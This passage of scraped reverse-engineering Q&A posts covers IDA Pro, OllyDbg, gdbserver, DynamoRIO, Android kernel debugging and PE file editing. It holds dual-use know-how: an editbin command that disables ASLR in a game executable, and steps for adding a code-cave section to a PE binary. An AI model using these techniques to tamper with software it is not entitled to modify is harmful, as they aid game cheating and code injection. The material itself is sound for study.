.text:4B2C12FC                 test    byte ptr [ecx], 8
.text:4B2C12FF                 jnz     loc_4B2C160B
.text:4B2C1305                 mov     edi, [esp+278h+var_25C]
.text:4B2C1309                 xor     al, al
.text:4B2C130B                 mov     ecx, large fs:30h
 .text:4B2C1312                 mov     [esp+278h+var_244], edi
</code></pre>

<p>Apparently, IDA Pro is disassembling the dll incorrectly. How can I make IDA Pro correctly disassemble 64 bit dlls?  </p>
","<p>On 64-bit Windows, any 32-bit process trying to access <code>C:\Windows\system32</code> is transparently redirected to <code>C:\Windows\SysWOW64</code>. </p>

<p>Since IDA (Both <code>idaq.exe</code> and <code>idaq64.exe</code>) are 32-bit processes, you are actually opening <code>C:\Windows\SysWOW64\ntdll.dll</code> (which is a 32-bit file) instead of <code>C:\Windows\system32\ntdll.dll</code>.</p>

<p>To open the correct file, copy it from <code>C:\Windows\system32</code> to a different directory, and open it from there.</p>
","12196"
"Do disassemblers detect standard functions?","876","","<p>Do disassemblers detect the use of C/C++ standard functions and specify them in the output code, adding the <code>#include</code> line to the appropriate header file (such as <code>stdio.h</code> or even <code>windows.h</code>)?</p>

<p>If not, does the whole big library is being recognized as the developer's own business-logic code, and written fully? Aren't the standard libraries known binary sequences (or can be processed some way to be known, as a binary-code can be different because of addressing)?</p>

<p>Do you know disassemblers that do detect standard functions and properly #include them in the output?</p>
","<p>IDA Pro will do such things thanks to its FLIRT feature.
You can take a look here to get more information : <a href=""https://reverseengineering.stackexchange.com/questions/175/what-is-a-flirt-signature"">What is a FLIRT signature?</a></p>
","3045"
"OllyDbg: Keep comments & labels in rebased DLL","876","","<p>My program loads and unloads a DLL of main interest at runtime.
I try to add comments and labels to the DLLs code, but when it is unloaded and loaded again, they are gone, as the DLL is rebased most of the time.</p>

<p>I'm in search for an OllyDbg plugin to preserve the comments and labels when a DLL gets rebased (for Olly 1, but this task is that important that I'd also switch to Olly 2 if there is a plugin only for 2).</p>

<ul>
<li>I tried <a href=""http://www.openrce.org/downloads/details/107/Labelmaster"" rel=""nofollow"">Labelmaster</a>, it can export and import comments and labels into text files. But the addresses in the textfiles are completely static and do not respect rebased DLLs.</li>
<li>A forum user <a href=""http://www.blizzhackers.cc/viewtopic.php?f=71&amp;t=310891&amp;start=0"" rel=""nofollow"">posted a plugin named ""Dynamic Debugging""</a> which would solve my problems as it can load stored comments and labels with a base address I can manually specify. However, the thread is from 2006, and the download cannot be found on the net anymore, not even in archives.</li>
</ul>

<p>Anyone knowing a plugin or still having the ""Dynamic Debugging"" plugin?</p>
","<p>OllyDbg2 supports this.</p>

<hr>

<p>For OllyDbg1:</p>

<p>I have extended the Labelmaster plugin mentioned above. It now subtracts the current modules base before exporting the labels and comments and adds the current modules base when importing them. Thus it's now requried to have the correct module focused when importing the files.</p>

<p>I also added importing label and comment files at once (but still with two open file dialogs and two different files, too lazy now to optimize this).</p>

<p>You can download the LabelmasterEx plugin by me here: </p>

<p>To convert your current Labelmaster exports, here's my Excel worksheet subtracting the bases from them: </p>

<hr>

<p>Another possibility of forcing ASLR off to get the same bases every time a DLL is loaded did not work for me. For those who want to try it: Start a Visual Studio Developer prompt (yeah, you'd need VS) and type in</p>

<pre><code>editbin /DYNAMICBASE:NO C:\Game\game.exe
</code></pre>

<p>It should modify the PE header to disable ASLR in that executable and all DLLs it loads. But as said, it had no effect for me.</p>
","6386"
"Using an existing IDB from IDA command line interface","876","","<p>Is there any way to use an existing IDB from the IDA command line interface ?</p>

<p>I went through the list of command line switches <a href=""https://www.hex-rays.com/products/ida/support/idadoc/417.shtml"" rel=""nofollow"">here</a> but there isn't any related switches.</p>

<p>As I am currently scripting IDA to do some processing based on the same file, I realised I could save some time by reusing the existing IDB, instead of repeatedly deleting and creating another new IDB per iteration. ( -c causes this behavior )  </p>

<p>My current command: <code>idaw.exe -c -A -SC:\someScript.py</code> </p>
","<blockquote>
  <p>My current command: <code>idaw.exe -c -A -SC:\someScript.py</code></p>
</blockquote>

<p>Remove the <code>-c</code> and add the existing IDB file's path:</p>

<p><code>idaw.exe -A -SC:\someScript.py C:\existingIdb.idb</code></p>
","6937"
"At which address on the stack or in memory is eax stored after the malloc call?","873","","<p>Here is my <code>objdump -d</code> snippet with the malloc call and surrounding code.  This binary is stripped.  </p>

<pre><code>dbgLab.bin:     file format elf32-i386


080483d0 &lt;malloc@plt&gt;:
 80483d0:   ff 25 04 a0 04 08       jmp    *0x804a004
 80483d6:   68 08 00 00 00          push   $0x8
 80483db:   e9 d0 ff ff ff          jmp    80483b0 &lt;printf@plt-0x10&gt;


Disassembly of section .text:


 804853e:   55                      push   %ebp
 804853f:   89 e5                   mov    %esp,%ebp
 8048541:   83 e4 f0                and    $0xfffffff0,%esp
 8048544:   83 ec 20                sub    $0x20,%esp
 8048547:   c6 44 24 1f cf          movb   $0xcf,0x1f(%esp)
 804854c:   c7 04 24 0d 00 00 00    movl   $0xd,(%esp)
 8048553:   e8 78 fe ff ff          call   80483d0 &lt;malloc@plt&gt;
 8048558:   89 44 24 18             mov    %eax,0x18(%esp)
 804855c:   83 7d 08 02             cmpl   $0x2,0x8(%ebp)
 8048560:   7f 0c                   jg     804856e &lt;strncmp@plt+0x12e&gt;
 8048562:   c7 04 24 ff ff ff ff    movl   $0xffffffff,(%esp)
 8048569:   e8 92 fe ff ff          call   8048400 &lt;exit@plt&gt;
 804856e:   8b 45 0c                mov    0xc(%ebp),%eax
 8048571:   83 c0 04                add    $0x4,%eax
 8048574:   8b 00                   mov    (%eax),%eax
 8048576:   c7 44 24 08 0d 00 00    movl   $0xd,0x8(%esp)
</code></pre>
","<p>A call to <code>malloc</code> returns the address of the allocated memory in the <code>eax</code> register on <code>x86</code>, <code>rax</code> on <code>x86_64</code>, and <code>r0</code> on <code>ARM</code>. Nothing is pushed on the stack. Check the line following the call to <code>malloc</code> &amp; you'll understand !
You should check the calling conventions of your platform too. </p>

<p>Suppose you have this in your code :</p>

<pre><code>      int *p = malloc(sizeof(int) * 4);
</code></pre>

<p>If you translate this line into assembly you'll get what follows : </p>

<pre><code>      call   80483d0 &lt;malloc@plt&gt;
      mov    %eax,0x18(%esp)
</code></pre>

<p>The <code>malloc</code> call returns in <code>eax</code> the address of allocated memory block. In the C code, this address is assigned to <code>p</code> which is a local variable located on the stack. And that's what the following assembly does : <code>mov %eax,0x18(%esp)</code>.    </p>
","4194"
"Call DLL export in OllyDBG","872","","<p>I am using OllyDbg 2.01 and I walked through this <a href=""http://www.ollydbg.de/Loaddll.htm"" rel=""nofollow noreferrer"">tutorial</a> to figure out how Call DLL export works. Even though it was written for another version of OllyDBG it work just fine. We should notice, that in example with USER32.dll OllyDBG detects number of input arguments, so I can change them from Call DLL export dialogue.</p>

<p>I decided to write my own DLL library in C++ in order to test OllyDBG functionality in a more detailed manner.</p>

<p>Here is a source code of my library.</p>

<pre><code>CPPlib.h

#pragma once
#ifdef CPPLib_EXPORTS  
#define CPPLib_API __declspec(dllexport)   
#else  
#define CPPLib_API __declspec(dllimport)   
#endif  

#include &lt;string&gt;

namespace CPPLib
{

    class Functions
    {
    public:

        static CPPLib_API void Identify();


        static CPPLib_API void GetText();


        static CPPLib_API void PrintText(std::string&amp; s);
    };
}


CPPLib.cpp

#include ""stdafx.h""  
#include ""CPPLib.h""  
#include &lt;iostream&gt;
#include &lt;windows.h&gt;

namespace CPPLib
{
    void Functions::Identify()
    {
        std::cout &lt;&lt; ""This is a CPPlib \r\n"";
    }

    void Functions::GetText()
    {
        std::cout &lt;&lt; ""This is a random text from CPPlib \r\n"";
    }

    std::wstring s2ws(const std::string&amp; s)
    {
        int len;
        int slength = (int)s.length() + 1;
        len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
        wchar_t* buf = new wchar_t[len];
        MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
        std::wstring r(buf);
        delete[] buf;
        return r;
    }

    void Functions::PrintText(std::string&amp; s)
    {
        std::wstring stemp = CPPLib::s2ws(s);
        LPCWSTR result = stemp.c_str();

        MessageBox(0, result, (LPCWSTR)L""MessageBox caption"", MB_OK);

        std::cout &lt;&lt; ""This is a user input text: "" &lt;&lt; s;
    }


}
</code></pre>

<p>In this question my interest is in the function <strong>PrintText</strong>. It takes string as an input argument, show Message box with it and prints the same string in the console.</p>

<p>If I call this function from C++ program - it works just fine.</p>

<pre><code>#include ""stdafx.h""
#include ""CPPLib.h""
#include &lt;string&gt;

int main()
{
    CPPLib::Functions::Identify();
    CPPLib::Functions::GetText();
    std::string s = ""USER INPUT"";
    CPPLib::Functions::PrintText(s);
    return 0;
}
</code></pre>

<p>Unlike in the example from tutorial, OllyDBG does not detect number of input arguments for my DLL.</p>

<p><a href=""https://i.stack.imgur.com/tBBs6.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/tBBs6.png"" alt=""function from user32.dll""></a>
USER32.dll</p>

<p><a href=""https://i.stack.imgur.com/WOMMu.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/WOMMu.png"" alt=""CPPLib.dll""></a>
CPPLib.dll</p>

<p>Moreover, even if I define it manually (e.g. choose Arg1 to be memory buffer 1) when calling that function it does not take what I wanted to be an argument. And there is no other way to change this argument as step into a function, find memory address to which it refers and change it there.</p>

<p>So my question is: Why does OllyDbg detect number of input arguments in functions (and allows to alter them easily) from USER32.dll and doesn't in my own DLL? How can I overcome this problem?</p>
","<p>i compiled the src in commandline (no vs using ewdk)<br>
and it appears ollydbg is able to identify the args and the call export seems to succeed here with some random crap thrown in for s    </p>

<p>i assume you are aware std::string is a structure and not a plain string<br>
you may need to properly craft a std::string and point the address of the std::string<br>
for you to see it in messagebox in the argument field </p>

<p>well for whatever it is worth here is a screenshot of my dab with what was posted and its results   </p>

<p><a href=""https://i.stack.imgur.com/YZHFb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/YZHFb.png"" alt=""enter image description here""></a></p>

<hr>

<h2><strong>EDIT</strong></h2>

<p>std::string is a structure as i mentioned </p>

<p>your s if you debugged your executable directly should be like this </p>

<pre><code>0:000&gt; dt -r9 s
Local var @ 0x22f984 Type std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;*
0x0022f98c
   +0x000 _Mypair          : std::_Compressed_pair&lt;std::_Wrap_alloc&lt;std::allocator&lt;char&gt; &gt;,std::_Str
ing_val&lt;std::_Simple_types&lt;char&gt; &gt;,1&gt;
      +0x000 _Myval2          : std::_String_val&lt;std::_Simple_types&lt;char&gt; &gt;
         +0x000 _Bx              : std::_String_val&lt;std::_Simple_types&lt;char&gt; &gt;::_Bxty
            +0x000 _Buf             : [16]  ""USER INPUT""
            +0x000 _Ptr             : 0x52455355  ""--- memory read error at address 0x52455355 ---""
            +0x000 _Alias           : [16]  ""USER INPUT""
         +0x010 _Mysize          : 0xa
         +0x014 _Myres           : 0xf
   =6e2a0000 npos             : 0x905a4d
0:000&gt;
</code></pre>

<p>so if you notice std::string contains a small performance optimization 
like if the string is less than 0x10 bytes it doesn't allocate memory but uses the buffer directly  if the string is bigger than 0x10 bytes it allocates memory </p>

<p>it has a size and max size members at 0x10 and 0x14 from the start of buffer   ie foo.cstr() you may need to properly set them  see below two snap shots one for a bigger std::string and one for a smaller std::string </p>

<p><a href=""https://i.stack.imgur.com/FW8sq.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/FW8sq.png"" alt=""enter image description here""></a></p>

<p>bigger string </p>

<p><a href=""https://i.stack.imgur.com/fuH3t.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/fuH3t.png"" alt=""enter image description here""></a></p>

<p>you should recognize 4021c0 as loaddlls dump1 space </p>

<p>hope that helps </p>

<p>as to why ollydbg shows two args may be it is a bug in the olly engine </p>

<p>according to windbg it is only one parameter </p>

<pre><code>0:000&gt; .fnent .
Debugger function entry 01e40268 for:
(6e2a10e0)   cpplib!CPPLib::Functions::PrintText   |  (6e2a1180)   cpplib!std::basic_string&lt;wchar_t,
std::char_traits&lt;wchar_t&gt;,std::allocator&lt;wchar_t&gt; &gt;::~basic_string&lt;wchar_t,std::char_traits&lt;wchar_t&gt;
,std::allocator&lt;wchar_t&gt; &gt;
Exact matches:
    cpplib!CPPLib::Functions::PrintText (class std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::al
locator&lt;char&gt; &gt; *, class std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt; *)

OffStart:  000010e0
ProcSize:  0x9d
Prologue:  0x29
Params:    0n1 (0x4 bytes) &lt;------------------------
Locals:    0n10 (0x28 bytes) 
Non-FPO
0:000&gt;
</code></pre>
","14739"
"How to create function prototype that recognizes arguments passed by reference in IDA Pro","871","","<p>I have a function prototype generated by IDA that looks like this:</p>

<p><a href=""https://i.stack.imgur.com/Qav80.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Qav80.png"" alt=""enter image description here""></a></p>

<p>However, it looks like there is a struct being referenced at the instruction <strong>lea edi, [esp+290h+var_240]</strong>. I would like IDA to reference this passed address as an argument in its function prototype.</p>

<p>I have tried the approach below, but it is clear that it does not work.</p>

<p><a href=""https://i.stack.imgur.com/lHm32.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/lHm32.png"" alt=""enter image description here""></a></p>

<p>What I would like to see is something like this</p>

<p><a href=""https://i.stack.imgur.com/yGgF1.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/yGgF1.png"" alt=""enter image description here""></a></p>

<p>Any help or suggestions would be greatly appreciated!</p>
","<p>My guess is that the function signature should be something like:</p>

<pre><code>int __usercall Call_HTTP@&lt;eax&gt;(int x, int y, void* http_object@&lt;edi&gt;);
</code></pre>

<ul>
<li><code>__usercall</code> means the calling convention for the function is not a standard one (like stdcall, cdecl, etc.) as the function passes two arguments on stack and one in edi.</li>
<li><code>@&lt;eax&gt;</code> : function returns a value in eax register.</li>
<li><code>int x</code> and <code>int y</code> are passed on the stack.</li>
<li><code>void* http_object@&lt;edi&gt;</code> : http_object is a void* passed through the edi register.</li>
</ul>

<p>You can change the type of the <code>http_object</code> by adding a proper structure for this object to the known IDA structures and pass the real type instead of <code>void*</code>.</p>

<p>For more information on function signature, see the IDA help on <a href=""https://www.hex-rays.com/products/ida/support/idadoc/1361.shtml"" rel=""nofollow"">Set function/item type</a>.</p>

<p><strong>Edit</strong></p>

<p>The right signature should be:</p>

<pre><code>int __userpurge Call_HTTP@&lt;eax&gt;(int x, int y, void* http_object@&lt;edi&gt;);
</code></pre>

<p>As stated by @itsbriany:</p>

<ul>
<li>for <code>__stdcall</code> and <code>__userpurge</code> calling conventions, the callee cleans up the stack.</li>
<li>in <code>__cdecl</code> and <code>__usercall</code> conventions, the caller cleans up the stack.</li>
</ul>
","11308"
"Working with multi-threaded program but can not find created thread","870","","<p>i am analyzing a piece of code in which the main thread does the following steps:</p>

<p>First, it calls CreateProcess() to create a a process in suspended state. Then it changes the starting address of the thread by using a combination of GetThreadContext &amp; SetThreadContext. The new start address of the thread is now 00401E1D. And at the end, it calls ResumeThread() start the thread.</p>

<p>So, what I did was: I set a BP at ResumeThread(), let it run, after hitting the BP I step over the ResumeThread()-function and open the window where all threads are listed by clicking on the big ""T""-button in Ollydbg.</p>

<p>But there is only the main thread, not the newly started thread. 
And now I have a couple of questions:</p>

<pre><code> 1st question: Why it is not in the list ?

 2nd question: How can I find it?

 3th question: 
 In the main thread, I can not step to 00401E1D 
 (starting address of the new thread) because ollydbg somehow 
  terminates itself. Maybe there is some anti-debugging tricks or 
  things like that. I do not know, because I did not analyze it yet
  in detail. So, the question is: Is there a way to analyze the 
  new thread starting at 00401E1D in a separate ollydbg-session ?
  Is it possible ?
</code></pre>

<p>best regards, </p>
","<p>In addition to creating the child process, <code>CreateProcess()</code> also causes the creation of the child process's primary thread. Your post makes it sound like the calls to <code>GetThreadContext()</code>, <code>SetThreadContext()</code>, and <code>ResumeThread()</code> all act on that primary thread.</p>

<blockquote>
  <p>1st question: Why it is not in the list ?</p>
</blockquote>

<p>As you said in your post, you are seeing the process's main (primary) thread, on which the <code>*Thread*()</code> API functions above acted. No additional threads are created so you shouldn't expect to see additional threads in OllyDbg's view.</p>

<blockquote>
  <p>2nd question: How can I find it?</p>
</blockquote>

<p>N/A</p>

<blockquote>
  <p>Is there a way to analyze the new thread starting at 00401E1D in a separate ollydbg-session ?</p>
</blockquote>

<p>Yes -- check the ""Debug child processes"" checkbox in OllyDbg's options:</p>

<p><img src=""https://i.stack.imgur.com/GDxO5.png"" alt=""OllyDbg""></p>
","8608"
"What does this code do, and what does it look like in C?","867","","<p>I'm using IDA to disassemble a file, and one of the sections contained this. What is this doing? What would it look like in C?</p>

<p>I believe it pushes edx onto the stack, and converts it to an integer using _atoi, but what is left in eax after that, and why is it comparing it to 5? </p>

<pre><code>mov     ecx, [ebp+argv]
mov     edx, [ecx+4]
push    edx             ; char *
call    _atoi
add     esp, 4
mov     [ebp+var_60], eax
cmp     [ebp+var_60], 5
jle     short loc_401167
</code></pre>

<p>Edit: Got a great answer, also another good answer here. <a href=""https://stackoverflow.com/questions/33535720/what-does-this-code-do-and-what-does-it-look-like-in-c/33535891#33535891"">https://stackoverflow.com/questions/33535720/what-does-this-code-do-and-what-does-it-look-like-in-c/33535891#33535891</a></p>
","<p>seems to be unoptimized compilation anyway if you were using ollydbg and compiled this code with debug information ollydbg will show the source code in the next column</p>

<p>source used </p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
int main (int argc , char* argv[]) {
  if(argc!=2){return -1;}
  signed int foo =0;
  if((foo = atoi(argv[1])) &gt; 5) {goto blah;}
  printf(""notok"");return 0;
  blah:
  printf(""ok"");return 1;
}
</code></pre>

<p>compiled with no optimisations    </p>

<p><strong>cl /Zi /EHsc /nologo /W4 /analyze *.cpp /link /RELEASE</strong></p>

<pre><code>00401000 a&gt;PUSH    EBP                         ; {
00401001   MOV     EBP, ESP
00401003   PUSH    ECX
00401004   CMP     DWORD PTR SS:[EBP+8], 2     ; if(argc!=2){return -1;}
00401008   JE      SHORT atoitest.0040100F
0040100A   OR      EAX, FFFFFFFF
0040100D   JMP     SHORT atoitest.00401055
0040100F   MOV     DWORD PTR SS:[EBP-4], 0     ; signed int foo =0;
00401016   MOV     EAX, DWORD PTR SS:[EBP+C]   ; if((foo = atoi(argv[1])) &gt; 5) {goto blah;}
00401019   MOV     ECX, DWORD PTR DS:[EAX+4]
0040101C   PUSH    ECX
0040101D   CALL    atoitest.atoi
00401022   ADD     ESP, 4
00401025   MOV     DWORD PTR SS:[EBP-4], EAX
00401028   CMP     DWORD PTR SS:[EBP-4], 5
0040102C   JLE     SHORT atoitest.00401032
0040102E   JMP     SHORT atoitest.00401043
00401030   JMP     SHORT atoitest.00401043
00401032   PUSH    atoitest.0041218C           ; printf(""notok"");return 0;
00401037   CALL    atoitest.printf
0040103C   ADD     ESP, 4
0040103F   XOR     EAX, EAX
00401041   JMP     SHORT atoitest.00401055
00401043   PUSH    atoitest.00412194           ; printf(""ok"");return 1;
00401048   CALL    atoitest.printf
0040104D   ADD     ESP, 4
00401050   MOV     EAX, 1
00401055   MOV     ESP, EBP                    ; }
00401057   POP     EBP
00401058   RETN
</code></pre>

<p>the same src code compiled with msvc /O1 does away all saves    </p>

<p><strong>cl /Zi /O1 /EHsc /nologo /W4 /analyze *.cpp /link /RELEASE</strong></p>

<pre><code>00401000 a&gt;CMP     DWORD PTR SS:[ESP+4], 2     ; {
00401005   JE      SHORT atoitest.0040100B
00401007   OR      EAX, FFFFFFFF
0040100A   RETN                                ; }
0040100B   MOV     EAX, DWORD PTR SS:[ESP+8]   ; if((foo = atoi(argv[1])) &gt; 5) {goto blah;}
0040100F   PUSH    DWORD PTR DS:[EAX+4]
00401012   CALL    atoitest.atoi
00401017   POP     ECX
00401018   CMP     EAX, 5
0040101B   JLE     SHORT atoitest.0040102C
0040101D   PUSH    atoitest.00412194           ; printf(""ok"");return 1;
00401022   CALL    atoitest.printf
00401027   XOR     EAX, EAX
00401029   INC     EAX
0040102A   POP     ECX
0040102B   RETN                                ; }
0040102C   PUSH    atoitest.0041218C           ; printf(""notok"");return 0;
00401031   CALL    atoitest.printf
00401036   XOR     EAX, EAX
00401038   POP     ECX
00401039   RETN                                ; }
</code></pre>

<p>same code with single exit and no gotos  </p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
int main (int argc , char* argv[]) {
  if(argc==2)  {
    int foo =0;
    if((foo = atoi(argv[1])) &gt; 5) {
      printf(""ok"");
    } else {
      printf(""notok"");
    }
  }
  return 0;
}
</code></pre>

<p>unoptimesed compilation </p>

<pre><code>00401000 a&gt;PUSH    EBP                         ; int main (int argc , char* argv[]) {
00401001   MOV     EBP, ESP
00401003   PUSH    ECX
00401004   CMP     DWORD PTR SS:[EBP+8], 2     ; if(argc==2)  {
00401008   JNZ     SHORT atoitest.00401045
0040100A   MOV     DWORD PTR SS:[EBP-4], 0     ; int foo =0;
00401011   MOV     EAX, DWORD PTR SS:[EBP+C]   ; if((foo = atoi(argv[1])) &gt; 5) {
00401014   MOV     ECX, DWORD PTR DS:[EAX+4]
00401017   PUSH    ECX
00401018   CALL    atoitest.atoi
0040101D   ADD     ESP, 4
00401020   MOV     DWORD PTR SS:[EBP-4], EAX
00401023   CMP     DWORD PTR SS:[EBP-4], 5
00401027   JLE     SHORT atoitest.00401038
00401029   PUSH    atoitest.0041218C           ; printf(""ok"");
0040102E   CALL    atoitest.printf
00401033   ADD     ESP, 4
00401036   JMP     SHORT atoitest.00401045     ; } else {
00401038   PUSH    atoitest.00412190           ; printf(""notok"");
0040103D   CALL    atoitest.printf
00401042   ADD     ESP, 4
00401045   XOR     EAX, EAX                    ; return 0;
00401047   MOV     ESP, EBP                    ; }
00401049   POP     EBP
0040104A   RETN
</code></pre>

<p>optimised compilation</p>

<pre><code>00401000 a&gt;CMP     DWORD PTR SS:[ESP+4], 2     ; int main (int argc , char* argv[]) {
00401005   JNZ     SHORT atoitest.0040102B
00401007   MOV     EAX, DWORD PTR SS:[ESP+8]   ; if((foo = atoi(argv[1])) &gt; 5) {
0040100B   PUSH    DWORD PTR DS:[EAX+4]
0040100E   CALL    atoitest.atoi
00401013   POP     ECX
00401014   CMP     EAX, 5
00401017   JLE     SHORT atoitest.00401020
00401019   PUSH    atoitest.00412194           ; printf(""ok"");
0040101E   JMP     SHORT atoitest.00401025     ; } else {
00401020   PUSH    atoitest.0041218C           ; printf(""notok"");
00401025   CALL    atoitest.printf
0040102A   POP     ECX
0040102B   XOR     EAX, EAX                    ; return 0;
0040102D   RETN                                ; }
</code></pre>
","11249"
"Is there something like follow-fork-mode for gdbserver?","865","","<p>My question is quite straight forward: is there a possibility to tell gdbserver to follow the child when forking like</p>

<pre><code>set follow-fork-mode child
</code></pre>
","<p>Unfortunately, it seems to be not supported (a bug?). See this <a href=""https://sourceware.org/bugzilla/show_bug.cgi?id=13584"" rel=""nofollow"">bug report</a> in <code>gdb</code> bugzilla.</p>

<p>I am not aware of any recent update concerning this bug...</p>
","3122"
"How can I use DynamoRIO or something similar in Linux kernel space?","860","","<p>I've found some universities that are porting <a href=""http://www.dynamorio.org/"" rel=""nofollow"">DynamoRIO</a> (or something very similar) to Linux kernel space, but the code doesn't seem to be available. Is there a resource I am unaware of?</p>

<p><a href=""http://www.cs.toronto.edu/~peter/feiner_asplos_2012.pdf"" rel=""nofollow"">Here's</a> an example. </p>
","<p>Yes, there is DynamoRIO Kernel (DRK), which is a DynamoRIO (DR) port created by Peter Feiner at the University of Toronto (U of T). The current DR source tree; however, does not contain DRK, despite the existence of a branch. DRK has yet to be open sourced, and U of T is actively doing kernel DBT research using DRK and a new DBT framework.</p>

<p>If you are thinking of porting it yourself, the two main challenges are:</p>

<ul>
<li>Interrupts and how they interact with the code cache. DRK took the ""direct port"" approach. For example, where DR uses thread-private code caches, DRK uses CPU-private code caches. This results in a lot of annoyances w.r.t. transparency and interrupts.</li>
<li>What level of transparency you want. DR was designed with a lot of transparency in mind, and DRK kept that promise. My experience with kernel instrumentation so far has been that it is remarkably well-behaved (unless you care about a small portion of device drivers). Transparency on several fronts can be sacrificed, but this is more challenging within the general DR framework.</li>
</ul>
","1944"
"How to use cycript to investigate a mach-o x86_64 binary?","854","","<p>I recently found out about a tool called cycript that apparently does runtime analysis of binaries written with Objective-C.  I have a Mac OS X binary that is compiled as x86_64 and is intended to run on Intel Macs.  I know cycript is intended to for iOS applications but I wouldn't mind using it on this binary to poke around and see what is going on inside the binary.  Most instructions I see for cycript state to start off with UIApp, and then investigating further objects from there.</p>

<p>My problem is when I try to investigate UIApp with cycript I get the following error message,</p>

<p><code>ReferenceError: hasProperty callback returned true for a property that doesn't exist.</code></p>

<p>I am assuming I am getting this error message because the binary does not have a UIApp class / method in it because it is a Mac OS X binary and not an iOS.</p>

<p>Where would be a good starting point for using cycript with a Mac OS X binary?</p>
","<p><code>UIApp</code> is a shorthand for <code>[UIApplication sharedApplication]</code>.</p>

<p>As this is not an iOS app, but an OS X app you need to use <code>[NSApplication sharedApplication]</code> instead.</p>
","3675"
"Reverse Engineering Android Kernel","850","","<p>How do I reverse engineer the Android kernel currently running on an Android phone?  I'm most interested in seeing/manipulating the call stack.  Basically, gdb or something like Ollydgb would be great.  I am not looking to build the kernel from source.</p>
","<p>Probably the easiest way to go about it is to find out what firmware image your phone is running and download it, extract the kernel blob (zImage), then fire that up in the android emulator/QEMU and remote kgdb into it.</p>

<p>You could unpack the kernel using unmkbootimg: <a href=""https://github.com/osm0sis/mkbootimg"" rel=""noreferrer"">https://github.com/osm0sis/mkbootimg</a></p>

<p>There are plenty of tutorials on xda for unpacking the kernel.</p>

<p>Here's a link of some dude debugging an android kernel in the emulator:
<a href=""http://www.informit.com/articles/article.aspx?p=2431417&amp;seqNum=3"" rel=""noreferrer"">http://www.informit.com/articles/article.aspx?p=2431417&amp;seqNum=3</a></p>
","12703"
"Adding a new PE section for a code cave","849","","<p>I am trying to add a 1000 byte code cave using LordPE to a standalone exe. From what I understand I have to edit the PE header with a new section of 1000 bytes then open the exe in a hex editor and add 1000 bytes to the end of the file.</p>

<p>When I add the new section the offset is not at the end of the file and It actually points to existing code. If I change the <code>RawOffset</code> to match the actual end of file <code>0xAE370</code> it gets corrupted. </p>

<p>Why won't the new section get added at the real end of file? Also, how can I add a new 1000 byte section without corrupting the file?</p>

<p><strong>Update:</strong>  The debugger still wasn't perfect on the location of the new section in the memory map but I can see my new bytes ~200h down from where they are listed. To get it to work I had to:</p>

<ul>
<li>Add the new section using CFF </li>
<li>Save it and open the file in a hex editor to find the true RawOffset</li>
<li>Then manually change the RawOffset in CFF to where my new bytes were actually placed by CFF <code>0xAE378</code></li>
<li>Back in CFF right click and rebuild PE header and rebuild image size (not sure if rebuilding the size part was necessary)</li>
<li>Now in the debugger navigate to where it says .NewSec is and scroll down a few hundred bytes and the new inserted bytes are there</li>
</ul>

<p>Still not sure why the memory map is slightly off but it's not too bad. I suppose once you find them you could edit the virtual address of the section to reflect where it actually is once loaded into memory.</p>

<p><a href=""https://i.stack.imgur.com/56Mgq.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/56Mgq.png"" alt=""enter image description here""></a></p>
","<p>Adding sections to PE files is not always as simple as editing the sections table. Sometimes you'll have to handle several edge cases such as menifest, signatures and other potential end-of-file optional ""extensions"".</p>

<p>Although LordPE is a great tool, it isn't the <em>best</em> tool for this task. It is too low-level, and doesn't let you create a complete new section transparently. It will let you edit the different fields as required for adding the new section, but you'll have to handle everything yourself.</p>

<p>There are more advanced PE editors, such as <a href=""http://www.ntcore.com/exsuite.php"" rel=""noreferrer"">CFF Explorer</a>, that provide the functionality to create sections from scratch. It will increase the file size of you and create a section you can directly edit from within CFF Explorer.</p>

<p>To add a new section, open a file with CFF Explorer, select the Section Headers option from the lefthand tree view, right click on the sections table, select the ""Add Section (Empty Space)"" option like in the following picture:</p>

<p><a href=""https://i.stack.imgur.com/zqXLq.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/zqXLq.png"" alt=""enter image description here""></a></p>

<p>Then, specify the size of the new section.</p>

<p>To edit the new section select it, and use the bottom panel to modify, paste, copy or fill the hex view of the section. You can right click on it to open a menu with additional editing options.</p>
","15048"
"has anyone used PIN for ARM","848","","<p>While looking around for ""PIN for ARM"" I came across <a href=""http://www.cs.virginia.edu/kim/docs/cases06.pdf"" rel=""nofollow"">this</a>. However, I don't seem to be able to locate it. Is it even made publicly available? Has anyone used this or anything similar?</p>
","<p>It used to be available at <a href=""https://software.intel.com/en-us/articles/pintool-downloads"" rel=""nofollow"">https://software.intel.com/en-us/articles/pintool-downloads</a>, but it looks like Intel pulled it between the summer and winter of 2012.</p>

<p>It's still available via the <a href=""https://archive.org/web/"" rel=""nofollow"">Internet Archive Wayback Machine</a> though, at <a href=""https://web.archive.org/web/20120618005139/http://software.intel.com/sites/landingpage/pintool/downloads/pin-2.0-5567-gcc.3.3.1-softfp-arm-linux.tar.gz"" rel=""nofollow"">https://web.archive.org/web/20120618005139/http://software.intel.com/sites/landingpage/pintool/downloads/pin-2.0-5567-gcc.3.3.1-softfp-arm-linux.tar.gz</a></p>
","6613"
"idapython - Get Xrefs to a stack variable","848","","<p>I am trying to write an IDAPython script that will return a list of references to a local stack-frame variable. However, I couldn't find any API that does so.</p>

<p>What I am trying to achieve is a code like:
<code>xrefs = get_variable_references('arg_4')</code> that will return the results corresponding with the GUI's results:</p>

